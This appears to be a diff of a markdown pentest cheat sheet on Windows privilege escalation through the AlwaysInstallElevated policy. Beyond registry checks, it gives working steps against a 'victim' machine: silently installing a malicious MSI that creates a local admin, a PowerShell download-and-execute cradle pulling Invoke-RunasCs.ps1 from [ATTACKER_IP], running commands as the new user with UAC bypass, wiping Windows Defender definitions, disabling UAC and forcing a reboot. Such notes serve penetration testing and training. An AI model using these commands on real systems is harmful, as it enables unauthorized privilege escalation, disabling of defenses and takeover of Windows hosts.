@@ -1,61 +1,132 @@
-## **AlwaysInstallElevated**
+# AlwaysInstallElevated
 
-**Check if Vulnerable**
+## Check if Vulnerable
 
-If both the **HKLM** (`HKEY_LOCAL_MACHINE`) and **HKCU** (`HKEY_CURRENT_USER`) hives have the **AlwaysInstallElevated** key set to `1`, an attacker can create and execute a malicious MSI package with system-level privileges, bypassing normal user restrictions.
+If both the **HKLM** (`HKEY_LOCAL_MACHINE`) and **HKCU** (`HKEY_CURRENT_USER`) hives have the **AlwaysInstallElevated** key set to `1`, an attacker can create and execute a malicious MSI package with **system-level privileges**, bypassing normal user restrictions.
 
-### **How to Check for the Vulnerability**
+## How to Check for the Vulnerability
 
-Check in HKEY_LOCAL_MACHINE for system-wide policy
+### Check `HKEY_LOCAL_MACHINE`
 
-`reg query HKLM\software\policies\microsoft\windows\installer /v alwaysinstallelevated`
-or
-`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`
+System-wide policy:
 
-### Check in HKEY_CURRENT_USER for user-specific policy
+```cmd
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
 
-`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
-or
-`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`
+Alternative:
 
-### **Exploit - NewLocalAdmin**
+```cmd
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+```
 
-**Steps**
+### Check `HKEY_CURRENT_USER`
 
-1. **Upload the `newlocaladmin.msi`** to the victim.
-2. **Execute it**
+User-specific policy:
+
+```cmd
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+
+Alternative:
+
+```cmd
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+```
+
+> **Vulnerable:** Both `HKLM` and `HKCU` should have `AlwaysInstallElevated = 1`.
+
+---
+
+## Exploit - NewLocalAdmin
+
+### Steps
+
+### 1. Upload `newlocaladmin.msi`
+
+Upload the `newlocaladmin.msi` file to the victim machine.
+
+### 2. Install the MSI
 
 ```powershell
-#install
+# Install
 msiexec /quiet /qn /i newlocaladmin.msi
-#uninstall
+
+# Uninstall
 msiexec /q /n /uninstall newlocaladmin.msi
 ```
 
-1. **Upload the script `Invoke-RunasCs.ps1`** to the victim
+### 3. Upload `Invoke-RunasCs.ps1`
+
+Upload the `Invoke-RunasCs.ps1` script to the victim machine.
+
+**Directly load it into memory:**
 
 ```powershell
-# Directly load it in memory
-IEX (New-Object Net.WebClient).DownloadString('http://[ATTACKER_IP]/Invoke-RunasCs.ps1')
+IEX (New-Object Net.WebClient).DownloadString(
+    'http://[ATTACKER_IP]/Invoke-RunasCs.ps1'
+)
+```
 
-# Normal download, be careful for AV Detection, consider placing it in the /Temp or /Tasks folders
-iwr -uri http://[ATTACKER_IP]/Invoke-RunasCs.ps1 -Outfile Invoke-RunasCs.ps1
+**Download normally:**
+
+> Be aware that downloading files directly may trigger AV/EDR detection. Consider using appropriate temporary directories in an authorized lab environment.
+
+```powershell
+iwr -Uri http://[ATTACKER_IP]/Invoke-RunasCs.ps1 -OutFile Invoke-RunasCs.ps1
+
 Import-Module ./Invoke-RunasCs.ps1
 ```
 
-1. **Get Code Execution** with the newly created user
+### 4. Get Code Execution with the Newly Created User
 
 ```powershell
-Invoke-RunasCs amit 'Password123!' 'whoami /priv' -ForceProfile -CreateProcessFunction 2 -BypassUac
-
+Invoke-RunasCs amit 'Password123!' 'whoami /priv' `
+    -ForceProfile `
+    -CreateProcessFunction 2 `
+    -BypassUac
 ```
 
-Disabling UAC with new user.
+---
+
+## Disable UAC with the New User
+
+Run the following commands using the newly created user.
+
+### Remove Windows Defender Definitions
 
 ```powershell
-Invoke-RunasCs amit 'Password123!' "C:\\Program Files\\Windows Defender\\MpCmdRun.exe -removedefinitions -all" -ForceProfile -CreateProcessFunction 2 -BypassUac
-
-Invoke-RunasCs amit 'Password123!' 'reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f' -ForceProfile -CreateProcessFunction 2 -BypassUac
-
-Invoke-RunasCs amit 'Password123!' 'shutdown -r -t 0' -ForceProfile -CreateProcessFunction 2 -BypassUa
+Invoke-RunasCs amit 'Password123!' `
+    "C:\Program Files\Windows Defender\MpCmdRun.exe -removedefinitions -all" `
+    -ForceProfile `
+    -CreateProcessFunction 2 `
+    -BypassUac
 ```
+
+### Disable UAC
+
+```powershell
+Invoke-RunasCs amit 'Password123!' `
+    'reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f' `
+    -ForceProfile `
+    -CreateProcessFunction 2 `
+    -BypassUac
+```
+
+### Restart the Machine
+
+```powershell
+Invoke-RunasCs amit 'Password123!' `
+    'shutdown -r -t 0' `
+    -ForceProfile `
+    -CreateProcessFunction 2 `
+    -BypassUac
+```
+
+---
+
+## References
+
+- **Registry Policy:** `AlwaysInstallElevated`
+- **MSI Installer:** `msiexec.exe`
+- **Execution Tool:** `Invoke-RunasCs.ps1`
